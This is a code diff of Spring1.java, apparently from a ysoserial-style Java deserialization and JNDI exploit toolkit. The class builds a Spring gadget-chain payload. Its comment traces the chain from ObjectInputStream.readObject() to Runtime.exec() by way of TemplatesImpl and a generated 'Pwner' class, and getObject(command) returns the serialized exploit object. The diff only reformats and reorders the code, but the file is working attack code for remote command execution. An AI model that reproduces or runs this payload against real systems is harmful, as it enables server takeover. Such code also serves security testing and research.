@@ -1,6 +1,5 @@
 package com.qi4l.jndi.gadgets;
 
-import com.qi4l.jndi.enumtypes.PayloadType;
 import com.qi4l.jndi.gadgets.annotation.Authors;
 import com.qi4l.jndi.gadgets.annotation.Dependencies;
 import com.qi4l.jndi.gadgets.utils.Gadgets;
@@ -13,40 +12,43 @@ import java.lang.reflect.Constructor;
 import java.lang.reflect.InvocationHandler;
 import java.lang.reflect.Type;
 
-
 import static java.lang.Class.forName;
 
 /**
  * Gadget chain:
- *
- * 		ObjectInputStream.readObject()
- * 			SerializableTypeWrapper.MethodInvokeTypeProvider.readObject()
- * 				SerializableTypeWrapper.TypeProvider(Proxy).getType()
- * 					AnnotationInvocationHandler.invoke()
- * 						HashMap.get()
- * 				ReflectionUtils.findMethod()
- * 				SerializableTypeWrapper.TypeProvider(Proxy).getType()
- * 					AnnotationInvocationHandler.invoke()
- * 						HashMap.get()
- * 				ReflectionUtils.invokeMethod()
- * 					Method.invoke()
- * 						Templates(Proxy).newTransformer()
- * 							AutowireUtils.ObjectFactoryDelegatingInvocationHandler.invoke()
- * 								ObjectFactory(Proxy).getObject()
- * 									AnnotationInvocationHandler.invoke()
- * 										HashMap.get()
- * 								Method.invoke()
- * 									TemplatesImpl.newTransformer()
- * 										TemplatesImpl.getTransletInstance()
- * 											TemplatesImpl.defineTransletClasses()
- * 												TemplatesImpl.TransletClassLoader.defineClass()
- * 													Pwner*(Javassist-generated).<static init>
- * 														Runtime.exec()
+ * <p>
+ * ObjectInputStream.readObject()
+ * SerializableTypeWrapper.MethodInvokeTypeProvider.readObject()
+ * SerializableTypeWrapper.TypeProvider(Proxy).getType()
+ * AnnotationInvocationHandler.invoke()
+ * HashMap.get()
+ * ReflectionUtils.findMethod()
+ * SerializableTypeWrapper.TypeProvider(Proxy).getType()
+ * AnnotationInvocationHandler.invoke()
+ * HashMap.get()
+ * ReflectionUtils.invokeMethod()
+ * Method.invoke()
+ * Templates(Proxy).newTransformer()
+ * AutowireUtils.ObjectFactoryDelegatingInvocationHandler.invoke()
+ * ObjectFactory(Proxy).getObject()
+ * AnnotationInvocationHandler.invoke()
+ * HashMap.get()
+ * Method.invoke()
+ * TemplatesImpl.newTransformer()
+ * TemplatesImpl.getTransletInstance()
+ * TemplatesImpl.defineTransletClasses()
+ * TemplatesImpl.TransletClassLoader.defineClass()
+ * Pwner*(Javassist-generated).<static init>
+ * Runtime.exec()
  */
-@SuppressWarnings({"rawtypes","unused"})
+@SuppressWarnings({"rawtypes", "unused"})
 @Dependencies({"org.springframework:spring-core:4.1.4.RELEASE", "org.springframework:spring-beans:4.1.4.RELEASE"})
 @Authors({Authors.FROHOFF})
-public class Spring1 implements ObjectPayload<Object>{
+public class Spring1 implements ObjectPayload<Object> {
+    public static boolean isApplicableJavaVersion() {
+        return JavaVersion.isAnnInvHUniversalMethodImpl();
+    }
+
     @Override
     public Object getObject(String command) throws Exception {
         final Object templates;
@@ -68,10 +70,5 @@ public class Spring1 implements ObjectPayload<Object>{
         Reflections.setFieldValue(mitp, "methodName", "newTransformer");
 
         return mitp;
-    }
-
-
-    public static boolean isApplicableJavaVersion() {
-        return JavaVersion.isAnnInvHUniversalMethodImpl();
     }
 }
